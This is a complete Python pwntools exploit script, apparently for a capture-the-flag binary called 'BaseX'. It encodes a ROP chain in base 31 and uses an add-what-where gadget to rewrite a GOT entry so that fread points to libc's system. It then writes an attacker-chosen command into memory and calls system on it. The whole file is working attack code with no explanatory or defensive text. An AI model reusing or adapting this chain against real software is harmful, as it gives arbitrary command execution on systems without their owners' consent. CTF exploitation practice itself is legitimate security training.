from pwn import *

#r = process(["strace", "./BaseX"])
#r = process(["./BaseX"])
#libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc = ELF("./libc.so.6")
fread = libc.symbols["fread"]
system = libc.symbols["system"]

rop = ""
place = 517

def num_to_31(num):
    s = ""
    while num:
        s += chr(ord('0') + num % 31)
        num /= 31
    return s[::-1]


def add(what):
    global rop, place
    s = num_to_31(what)
    rop += s + (20 - len(s)) * "\x00"
    rop += str(place<<32) + (20 - len(str(place<<32))) * "\x00"
    place += 1

RDI = 0x00000000004008f3 # pop rdi ; ret
RBP = 0x0000000000400598 # pop rbp ; ret
FREAD = 0x40083d # fread(rbp-0x20, 1, 0x14, stdin); ...
RBXRBP = 0x000000000040075f # pop rbx ; pop rbp ; ret
ADD = 0x00000000004005f8 # add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret

def add_what_where(what, where):
    add(RBXRBP)
    add(what)
    add(where + 0x3d)
    add(ADD)


print hex(fread)
print hex(system)

SAFE = 0x601050

add(0x1234)
add_what_where(2**32 + system - fread, 0x601018)
cmd = sys.argv[1]
print len(cmd)
cmd += (40 - len(cmd)) * "\x00"
for i in range(10):
    add_what_where(struct.unpack("<I", cmd[4*i:4*i+4])[0], SAFE+4*i)

add(RDI)
add(SAFE)
add(0x400500)

print rop.encode("hex")
with open("rop", "wb") as f:
    f.write(rop)
